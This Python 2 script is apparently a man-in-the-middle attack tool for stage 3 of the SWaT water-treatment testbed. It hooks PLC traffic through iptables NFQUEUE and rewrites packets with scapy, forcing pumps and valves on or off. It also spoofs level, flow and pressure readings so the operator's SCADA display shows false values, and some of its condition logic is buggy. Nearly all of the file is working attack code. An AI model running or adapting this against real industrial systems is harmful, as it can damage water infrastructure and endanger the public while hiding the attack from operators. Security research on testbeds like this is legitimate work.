#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2019  Beebi Siti Salimah Binte Liyakkathali, liyakkathali@sutd.edu.sg
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER

# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

#Last modified on: 06 May 2019

# Script part of A6_L0 Mitm tool: https://github.com/ibmilo/A6-L0-MITM
# Some attributes to 	https://github.com/ifyouaretea/A6-MITM
#			https://github.com/scy-phy/swat

#remarks: AIT301, 302, 303  scaling not done.  


import datetime
import ctypes
from time import sleep
from time import time as ts
import signal
import os
import sys
from netfilterqueue import NetfilterQueue
from scapy import all as scapy_all
from scapy.layers.inet import IP
from scapy.layers.inet import UDP

from plc_3 import SWAT_P3_RIO_DO, SWAT_P3_RIO_DI, SWAT_P3_RIO_AI

from scaling_all import P1Flow, P1Level, P2Flow, P2Cond, P2Ph, P2Orp, P3Level, P3Flow, P3DPress, \
                    P4Level, P4Hrdss, P4Flow, P4Orp, \
                    P5FeedPh, P5FeedOrp, P5FeedCond, P5PremCond, P5FeedFlow, P5PermFlow,\
                    P5ConcFlow, P5RecFlow, P5HPumpPress, P5PermPress, P5ConcPress,\
                    P6BackFlow, current_to_signal, signal_to_current



global toggle_flag
global current_spoofed


device_type = []
device_tag = []
value = []
scada = []



class attack_P3_level0:

	toggle_flag = False


	def __init__(self):
		self.toggle_flag = False


	def start(self):
	    self.nfqueue = NetfilterQueue()
	    os.system('sudo iptables -t mangle -A PREROUTING -s 192.168.0.32,192.168.0.30 -p udp --dport 2222 -j NFQUEUE --queue-num 2')
	    self.nfqueue.bind(2, self._launch_P3_attack,10)
	    self.nfqueue.run()
	    print('***********************inject start******************************')


	def stop(self):
	    os.system('sudo iptables -t mangle -F')
	    self.nfqueue.unbind()
	    print('*** STOPPING IPTABLES ***')




	def _launch_P3_attack (self,packet):

		global device_tag
		global value 
		global scada

		length = len(device_tag)
		ind = 0
		pkt = IP(packet.get_payload())


		while ind < length:

			dev = device_tag[ind]
			val = value[ind]
			sca = scada[ind]

			if SWAT_P3_RIO_DO in pkt:
				if dev  == "P301":
				    pkt[SWAT_P3_RIO_DO].UFFpump1_start = val
				if dev  == "P302":
					pkt[SWAT_P3_RIO_DO].UFFpump2_start = val



				if val == 0:
				    if dev  == "MV301":
				        pkt[SWAT_P3_RIO_DO].UFFvalve_close = 1
				        pkt[SWAT_P3_RIO_DO].UFFvalve_open = 0

				    if dev  == "MV302":
				        pkt[SWAT_P3_RIO_DO].ROvalve_close = 1
				        pkt[SWAT_P3_RIO_DO].ROvalve_open = 0

				    if dev  == "MV303":
				        pkt[SWAT_P3_RIO_DO].Dvalve_close = 1
				        pkt[SWAT_P3_RIO_DO].Dvalve_open = 0

				    if dev  == "MV304":
				    	pkt[SWAT_P3_RIO_DO].UFDvalve_close = 1
				    	pkt[SWAT_P3_RIO_DO].UFDvalve_open = 0

				if val == 1:
				    if dev  == "MV301":
				        pkt[SWAT_P3_RIO_DO].UFFvalve_close = 0
				        pkt[SWAT_P3_RIO_DO].UFFvalve_open = 1

				    if dev  == "MV302":
				        pkt[SWAT_P3_RIO_DO].ROvalve_close = 0
				        pkt[SWAT_P3_RIO_DO].ROvalve_open = 1

				    if dev  == "MV303":
				        pkt[SWAT_P3_RIO_DO].Dvalve_close = 0
				        pkt[SWAT_P3_RIO_DO].Dvalve_open = 1

				    if dev  == "MV304":
				    	pkt[SWAT_P3_RIO_DO].UFDvalve_close = 0
				    	pkt[SWAT_P3_RIO_DO].UFDvalve_open = 1



			if SWAT_P3_RIO_DI in pkt:

				if dev  == "P301":
				    pkt[SWAT_P3_RIO_DI].UFFpump1_run = sca
				elif dev  == "P302":
					pkt[SWAT_P3_RIO_DI].UFFpump2_run = sca

				elif dev == "DPSH301": 
					pkt[SWAT_P3_RIO_DI].UFpressure = sca

				elif dev == "PSH301":
					pkt[SWAT_P3_RIO_DI].UFDpressure = sca

				else : 
					if sca == 0:
					    if dev  == "MV301":
					        pkt[SWAT_P3_RIO_DI].BWvalve_close = 1
					        pkt[SWAT_P3_RIO_DI].BWvalve_open = 0

					    elif dev  == "MV302":
					        pkt[SWAT_P3_RIO_DI].ROvalve_close = 1
					        pkt[SWAT_P3_RIO_DI].ROvalve_open = 0

					    elif dev  == "MV303":
					        pkt[SWAT_P3_RIO_DI].Dvalve_close = 1
					        pkt[SWAT_P3_RIO_DI].Dvalve_open = 0

					    else: #dev  == "MV304":
					    	pkt[SWAT_P3_RIO_DI].UFDvalve_close = 1
					    	pkt[SWAT_P3_RIO_DI].UFDvalve_open = 0

					else :#sca == 1:
					    if dev  == "MV301":
					        pkt[SWAT_P3_RIO_DI].BWvalve_close = 0
					        pkt[SWAT_P3_RIO_DI].BWvalve_open = 1

					    elif dev  == "MV302":
					        pkt[SWAT_P3_RIO_DI].ROvalve_close = 0
					        pkt[SWAT_P3_RIO_DI].ROvalve_open = 1

					    elif dev  == "MV303":
					        pkt[SWAT_P3_RIO_DI].Dvalve_close = 0
					        pkt[SWAT_P3_RIO_DI].Dvalve_open = 1

					    else :#if dev  == "MV304":
					    	pkt[SWAT_P3_RIO_DI].UFDvalve_close = 0
					    	pkt[SWAT_P3_RIO_DI].UFDvalve_open = 1

				


			if SWAT_P3_RIO_AI in pkt:

				if dev == "LIT301":
					self.true_measurement_P3_level =  current_to_signal(pkt[SWAT_P3_RIO_AI].LIT301_Level, P3Level)  #scaling

					if(self.toggle_flag == False):
						spoofed_measurement = self.true_measurement_P3_level
						self.toggle_flag = True

					if(self.toggle_flag):
						spoofed_measurement = val
						current_spoofed = signal_to_current(spoofed_measurement, P3Level) 
						pkt[SWAT_P3_RIO_AI].LIT301_Level =  current_spoofed

			   			print('LIT301 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P3_level,spoofed_measurement))


				if dev == "FIT301":
					self.true_measurement_P3_flow =  current_to_signal(pkt[SWAT_P3_RIO_AI].FIT301_Flow, P3Flow)  #scaling

					if(self.toggle_flag == False):
						spoofed_measurement = self.true_measurement_P3_flow
						self.toggle_flag = True

					if(self.toggle_flag):
						spoofed_measurement = val
						current_spoofed = signal_to_current(spoofed_measurement, P3Flow) 
						pkt[SWAT_P3_RIO_AI].FIT301_Flow =  current_spoofed

						print('FIT301 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P3_flow,spoofed_measurement))

			       

				if dev == "DPIT301":

					self.true_measurement_P3_pressure =  current_to_signal(pkt[SWAT_P3_RIO_AI].DPIT301_Differential_pressure, P3DPress)  #scaling

					if(self.toggle_flag == False):
						spoofed_measurement = self.true_measurement_P3_pressure
						self.toggle_flag = True

					if(self.toggle_flag):
						spoofed_measurement = val
						current_spoofed = signal_to_current(spoofed_measurement, P3DPress) 
						pkt[SWAT_P3_RIO_AI].DPIT301_Differential_pressure =  current_spoofed

						print('DPIT301 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P3_pressure,spoofed_measurement))

			   	'''
			   	#Scaling may not be accurate 
				if dev == "AIT301":

					self.true_measurement_P3_pH =  current_to_signal(pkt[SWAT_P3_RIO_AI].AIT301_pH, P3DPress)  #scaling

					if(self.toggle_flag == False):
						spoofed_measurement = self.true_measurement_P3_pH
						self.toggle_flag = True

					if(self.toggle_flag):
						spoofed_measurement = val
						current_spoofed = signal_to_current(spoofed_measurement, P3DPress) 
						pkt[SWAT_P3_RIO_AI].AIT301_pH =  current_spoofed

						print('DPIT301 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P3_pH,spoofed_measurement))

			    
				if dev == "AIT302":

					self.true_measurement_P3_ORP =  current_to_signal(pkt[SWAT_P3_RIO_AI].AIT302_ORP, P3DPress)  #scaling

					if(self.toggle_flag == False):
						spoofed_measurement = self.true_measurement_P3_ORP
						self.toggle_flag = True

					if(self.toggle_flag):
						spoofed_measurement = val
						current_spoofed = signal_to_current(spoofed_measurement, P3DPress) 
						pkt[SWAT_P3_RIO_AI].AIT302_ORP =  current_spoofed

						print('AIT302 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P3_ORP,spoofed_measurement))

			      


				if dev == "AIT303":

					self.true_measurement_P3_cond =  current_to_signal(pkt[SWAT_P3_RIO_AI].AIT303_Cond, P3DPress)  #scaling

					if(self.toggle_flag == False):
						spoofed_measurement = self.true_measurement_P3_cond
						self.toggle_flag = True

					if(self.toggle_flag):
						spoofed_measurement = val
						current_spoofed = signal_to_current(spoofed_measurement, P3DPress) 
						pkt[SWAT_P3_RIO_AI].AIT303_Cond =  current_spoofed

						print('AIT303 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P3_cond,spoofed_measurement))
				
	         	'''



			ind = ind +1
			del pkt[UDP].chksum  # Need to recompute checksum
			pkt.show()
			packet.set_payload(str(pkt))
		packet.accept()

def start():

     attacker = attack_P3_level0();
     def signal_term_handler(signal, frame):
         print('*** STOPPING')
         attacker.stop()

     signal.signal(signal.SIGTERM, signal_term_handler)
     try:
         print('attacker is loaded')
         attacker.start()
         signal.pause()  # wait for a signal
     except KeyboardInterrupt:
         print('*** STOPPING')
         attacker.stop()




if __name__=='__main__':
  
    num_of_attacks = int(raw_input('Enter number of actuators attacks : '))


    for i in range (num_of_attacks) :
		print ("For Point %i >>>") % (i + 1)

		dev_type = raw_input('Enter device type to attack (e.g PUMP, AIT, VALVE) : ')
		dev_tag = raw_input('Enter tag  to attack (e.g P301, MV301, FIT301, DPIT301) : ')

		if dev_type == "DPSH" or dev_type == "PSH":
		   sca =  int (raw_input('Enter value - ON (1) or OFF (0) : '))
		   val = 0

		elif dev_type == "PUMP" or dev_type == "VALVE" or dev_type == "LED" or dev_type == "DPSH" or dev_type == "PSH":
		   val =  int (raw_input('Enter value - ON (1) or OFF (0) : '))
		   sca =  int (raw_input('Set SCADA display to - ON (1) or OFF (0) : '))

		elif dev_type == "FIT" or dev_type == "LIT" or "AIT" or "DPIT":
		    val =  int (raw_input('Enter value to spoofed value : '))
		    sca = 0
		else:
		    print "Device type not found"
		    sys.exit()

		


		if dev_tag == "P301" or dev_tag == "P302" or dev_tag == "LIT301" or dev_tag == "FIT101" \
		or dev_tag == "DPIT301" or dev_tag == "P302" or  dev_tag == "MV301" or  dev_tag == "MV302"  \
		or  dev_tag == "MV302" or  dev_tag == "MV303" or  dev_tag == "MV304"\
		or dev_tag == "DPSH301" or dev_tag =="PSH301" : 
		 

			device_type.append(dev_type)
			device_tag.append(dev_tag)
			value.append(val)
			scada.append(sca)
          
		else:
		  print "Device tag not found"
		  sys.exit()

    sys.exit(start())
